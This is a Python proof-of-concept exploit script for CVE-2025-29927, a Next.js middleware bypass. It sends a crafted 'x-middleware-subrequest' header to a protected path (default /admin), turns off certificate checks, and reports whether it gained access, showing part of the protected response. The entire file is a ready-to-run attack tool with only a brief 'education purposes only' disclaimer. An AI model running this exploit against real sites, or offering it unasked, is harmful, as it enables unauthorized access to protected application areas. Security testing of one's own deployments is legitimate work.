#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import argparse
import sys
import logging
from typing import Optional

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Color:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'

def print_banner():
    banner = f"""
{Color.CYAN}
 _   _  ___________ _____   ___  _   _ _____   _____ _   _ ___________ 
| \ | ||  _  | ___ \_   _| / _ \| | | |  ___| /  __ \ | | |  ___| ___ \\
|  \| || | | | |_/ / | |  / /_\ \ | | | |__   | /  \/ | | | |__ | |_/ /
| . ` || | | |    /  | |  |  _  | | | |  __|  | |   | | | |  __||    / 
| |\  |\ \_/ / |\ \  | |  | | | | |_| | |___  | \__/\ \_/ / |___| |\ \ 
\_| \_/\___/\_| \_| \_/  \_| |_/\___/\____/   \____/\___/\____/\_| \_|
                                                         
{Color.YELLOW}PoC Template for Web Vulnerability Analysis
{Color.RED}Disclaimer: This CVE-2025-29927 PoC is for education purposes only..{Color.RESET}
"""
    print(banner)

class NextjsExploit:
    def __init__(self, target: str, path: str, scheme: str, header_value: str,
                 proxy: Optional[str], user_agent: str, verbose: bool):
        self.target = target
        self.path = path if path.startswith('/') else f'/{path}'
        self.scheme = scheme
        self.header_value = header_value
        self.verbose = verbose
        self.url = f"{self.scheme}://{self.target}{self.path}"

        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': user_agent})

        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self._setup_logging()

    def _setup_logging(self):
        level = logging.DEBUG if self.verbose else logging.INFO
        logging.basicConfig(level=level, format='%(message)s')

    def run_exploit(self):
        logging.info(f"{Color.BLUE}[*] Target URL:{Color.RESET} {self.url}")
        
        headers = {"x-middleware-subrequest": self.header_value}
        
        logging.debug(f"{Color.YELLOW}[DEBUG] Using special header:{Color.RESET} 'x-middleware-subrequest: {self.header_value}'")
        logging.debug(f"{Color.YELLOW}[DEBUG] Full headers:{Color.RESET} {self.session.headers}")

        try:
            response = self.session.get(self.url, headers=headers, timeout=15, allow_redirects=False)

            logging.debug(f"{Color.YELLOW}[DEBUG] Response Status Code:{Color.RESET} {response.status_code}")
            logging.debug(f"{Color.YELLOW}[DEBUG] Response Headers:{Color.RESET}\n{response.headers}")

            if response.status_code == 200:
                logging.info(f"{Color.GREEN}[+] SUCCESS:{Color.RESET} Middleware bypassed! Access granted.")
                snippet = response.text[:500].strip()
                print(f"\n--- Response Snippet ---\n{snippet}\n------------------------\n")
            elif 300 <= response.status_code < 400:
                location = response.headers.get('Location', 'N/A')
                logging.warning(f"{Color.YELLOW}[-] FAILED:{Color.RESET} Exploit likely failed. Received a redirect ({response.status_code}) to: {location}")
            else:
                logging.error(f"{Color.RED}[-] FAILED:{Color.RESET} Access denied. Status code: {response.status_code}")
                if self.verbose:
                    print(f"\n--- Full Response ---\n{response.text[:1000]}\n---------------------\n")

        except requests.exceptions.Timeout:
            logging.error(f"{Color.RED}[!] ERROR:{Color.RESET} The request timed out. The server might be down or too slow.")
            sys.exit(1)
        except requests.exceptions.RequestException as e:
            logging.error(f"{Color.RED}[!] REQUEST ERROR:{Color.RESET} An error occurred: {e}")
            sys.exit(1)

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="A professional PoC template to test for Next.js middleware bypass.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument("host", help="Target host and port (e.g., localhost:3000)")
    parser.add_argument("-p", "--path", default="/admin", help="Protected route path to access (default: /admin)")
    parser.add_argument("-s", "--scheme", choices=["http", "https"], default="http", help="Protocol to use (http or https)")
    parser.add_argument("--header", default="middleware:middleware", help="Value for the x-middleware-subrequest header")
    parser.add_argument("-ua", "--user-agent", default="Mozilla/5.0", help="Custom User-Agent for the request")
    parser.add_argument("--proxy", help="Proxy to use for requests (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose debug output")
    
    args = parser.parse_args()

    try:
        exploit = NextjsExploit(
            target=args.host,
            path=args.path,
            scheme=args.scheme,
            header_value=args.header,
            proxy=args.proxy,
            user_agent=args.user_agent,
            verbose=args.verbose
        )
        exploit.run_exploit()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}[!] User aborted. Exiting...{Color.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    main()
